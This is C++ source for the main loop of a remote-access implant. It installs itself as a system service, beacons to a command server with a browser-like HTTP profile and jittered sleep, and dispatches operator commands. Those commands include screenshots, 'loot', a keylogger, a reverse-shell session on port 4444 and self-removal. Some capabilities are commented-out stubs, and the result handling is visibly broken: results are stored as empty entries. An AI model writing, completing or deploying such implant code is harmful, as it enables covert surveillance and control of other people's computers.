#include <HttpUtils.hpp>
#include <RESTClient.hpp>
#include <cpppwn.hpp>
#include <SQLiteCpp/SQLiteCpp.h>
#include <filesystem>
#include <vector>
#include <print>

#include "Beacon.hpp"
#include "CommandDAO.hpp"
#include "Installer.hpp"
#include "Config.hpp"
#include "Types.hpp"
#include "Implant.hpp"

constexpr bool debug_print = true;

//-------------------------------------------------
//
//-------------------------------------------------
int main(int argc, char* argv[]) {
    bool is_installation = false;

    // parse arguments
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--install") {
            is_installation = true;
            break;
        }
    }

    // Installation
    if (is_installation) {
        if (installSystemService(config.service_name, config.service_desc)) {
            return 0; // everything went fine!
        } else {
            return 1; // installation not successful! Probably missing permissions
        }
    }

    if constexpr (debug_print) {
        std::println("Starting main logic of the implant...");
    }

    // If we are not in Installation mode
    const auto& browser_config = HttpConfig(BrowserType::Firefox);
    cpppwn::RESTClient rest_client(config.server_url, browser_config);
    rest_client.set_auth_basic(config.username, config.password);

    const auto default_sleep = std::atol(config.default_timeout);
    int current_sleep = default_sleep;
    bool running = true;

    while (running) {
        std::vector<CommandDAO> command_list = sendBeacon(rest_client);

        if constexpr (debug_print) {
            std::println("UUID: {} | Count of Commands: {}", get_or_create_id(), command_list.size());
        }

        for (const auto& cmd : command_list) {
            if constexpr (debug_print) {
                std::println("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
            }

            CommandResult res;
            res.command_uid = cmd.uid;

            if (cmd.command.starts_with("timeout")) {
                // Usage: timeout 10
                try {
                    current_sleep = std::stoi(cmd.command.substr(8));
                    res.result_data = "Sleep interval updated to " + std::to_string(current_sleep) + "m";
                } catch (...) { res.status = 0; res.result_data = "Invalid timeout format"; }
            } else if (cmd.command.starts_with("screenshot")) {
                // On Linux, this often requires 'import' (ImageMagick) or 'gnome-screenshot'
                // We'll simulate the call; in reality, you'd read the file and base64 encode it.
                //shell_exec("gnome-screenshot -f /tmp/s.png");
                res.result_data = "Screenshot captured to /tmp/s.png (Upload logic pending)";
            } else if (cmd.command.starts_with("loot")) {

            } else if (cmd.command.starts_with("keylogger_start")) {
                // This usually involves starting a background thread reading /dev/input/
                res.result_data = "Keylogger background thread started";
                // start_keylogger_thread();
            } else if (cmd.command.starts_with("keylogger_stop")) {
                res.result_data = "Keylogger stopped. Data cached.";
                // stop_keylogger_thread();
            } else if (cmd.command.starts_with("session")) {
                // Open a reverse shell or interactive session
                res.result_data = "Interactive session requested on port 4444";
            } else if (cmd.command.starts_with("uninstall")) {
                // Self-deletion logic
                std::filesystem::remove(std::filesystem::current_path() / "identity.dat");
                res.result_data = "Agent uninstalled. Process exiting.";
                exit(0);
            }

            // Store result to be sent in the NEXT beacon
            std::lock_guard<std::mutex> lock(results_mtx);
            command_results.push_back({});
        }

        if (not running) {
            break;
        }

        int jitter = (generate_nonce() % 60);
        auto sleep_duration = std::chrono::minutes(current_sleep) + std::chrono::seconds(jitter);

        std::this_thread::sleep_for(sleep_duration);
    }

    if constexpr (debug_print) {
        std::println("Shutting down Implant!");
    }

    return 0;
}